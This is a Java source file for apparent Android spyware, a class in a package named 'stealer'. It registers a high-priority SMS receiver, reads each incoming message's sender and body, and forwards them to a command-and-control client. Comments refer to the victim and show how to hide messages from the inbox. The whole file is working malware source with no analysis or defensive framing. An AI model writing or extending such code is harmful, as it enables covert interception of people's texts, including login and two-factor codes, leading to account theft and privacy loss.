// lang: Java, file: SmsReceiver.java, target: Android 8+ API 26
// high-priority broadcast receiver — intercepts SMS before default SMS app sees it

package com.example.zeca.stealer;

import android.content.*;
import android.telephony.SmsMessage;

public class SmsReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context ctx, Intent intent) {
        if (!"android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction())) return;

        Object[] pdus = (Object[]) intent.getExtras().get("pdus");
        String format = intent.getStringExtra("format");
        if (pdus == null) return;

        StringBuilder sb = new StringBuilder();
        for (Object pdu : pdus) {
            SmsMessage msg = SmsMessage.createFromPdu((byte[]) pdu, format);
            sb.append("FROM: ").append(msg.getOriginatingAddress()).append("\n")
              .append("BODY: ").append(msg.getMessageBody()).append("\n\n");
        }

        C2Client.send(ctx, "SMS_LIVE", sb.toString());
        // do NOT abort broadcast here unless you want to hide SMS from victim's inbox
        // abortBroadcast();
    }
}